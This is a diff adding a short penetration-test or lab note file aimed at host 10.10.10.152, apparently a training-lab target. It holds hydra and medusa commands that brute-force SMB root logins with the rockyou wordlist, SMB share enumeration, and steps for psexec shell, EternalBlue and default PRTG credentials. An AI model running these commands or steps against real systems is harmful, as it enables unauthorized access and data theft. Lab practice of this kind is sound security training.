@@ -1,0 +1,18 @@
+false creds
+harrypotter
+freedom
+
+hydra -l root -P /usr/share/wordlists/rockyou.txt 10.10.10.152 smb -vV
+medusa -h 10.10.10.152 -u root -P /usr/share/wordlists/rockyou.txt -M smbnt
+smbclient -L 10.10.10.152
+find shares
+download all dirs from shares
+use pexec to spawn shell
+
+eternalblue_doublepulsar
+
+port 80
+default creds prtgadmin/prtgadmin
+rce
+xss
+
